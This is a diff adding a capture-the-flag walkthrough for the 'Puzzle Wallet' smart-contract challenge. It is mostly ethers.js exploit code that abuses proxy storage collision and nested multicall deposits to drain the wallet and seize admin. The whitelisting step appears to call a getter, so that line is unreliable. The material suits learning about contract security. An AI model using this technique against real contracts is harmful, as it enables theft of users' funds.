@@ -338,3 +338,66 @@ The learning is that even though the called contract is restricted to be a view 
 - Swap your own **1** MyToken to `token1` with the DEX (100% of MyToken).
 - Swap your own **2** MyToken to `token2` with the DEX (100% of MyToken).
 - By this point, all `token1` and `token2` have been depleted from the DEX. Submit the solution.
+
+## Problem 24: Puzzle Wallet
+
+- PuzzleProxy contract: [0x7a162793a1EBE2C04A288994d8F8457719cd7Fcc](https://eth-sepolia.blockscout.com/address/0x7a162793a1EBE2C04A288994d8F8457719cd7Fcc)
+
+**Solution**
+
+- Build up the proxy interface for the contract
+
+  ```ts
+  let proxyAbi = [
+    "function pendingAdmin() view returns (address)",
+    "function admin() view returns (address)",
+    "function proposeNewAdmin(address)",
+    "function approveNewAdmin(address)",
+    "function upgradeTo(address)",
+  ];
+
+  let proxyContract = new _ethers.Contract(contract.address, proxyAbi, provider);
+  ```
+
+- Propose the new admin via the PuzzleProxy function selector
+  ```ts
+  await proxyContract.proposeNewAdmin(player)
+  ```
+
+- Whitelist the player himself
+  ```ts
+  await contract.whitelisted(player)
+  ```
+
+- Then we want to construct a multicall like this:
+  ```
+  contract.multicall([
+    multicall([deposit()]),
+    multicall([deposit()]),
+    multicall([deposit()]),
+  ], { value: 0.005 })
+  ```
+
+  With this, we will only deposit **0.005** `msg.value`, but being recorded as **0.015**, that is `balance[player] == 0.015 ether`.
+
+  Execute the following:
+
+  ```ts
+  let depositSel = iface.encodeFunctionData("deposit");
+  // depositSel becomes '0xd0e30db0'
+
+  let multiCallSel = iface.encodeFunctionData("multicall", [[depositSel]]);
+  // multiCallSel becomes '0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000'
+
+  await contract.multicall([multiCallSel, multiCallSel, multiCallSel], {value: toWei("0.005")});
+  ```
+
+- Now we can withdraw all the balance of the contract and call setMaxBalance()
+  ```ts
+  // withdraw the money
+  await contract.execute(player, toWei("0.006"), "0x")
+
+  // call setMaxBalance()
+  let playerBN = _ethers.BigNumber.from(player);
+  await contract.setMaxBalance(playerBN);
+  ```
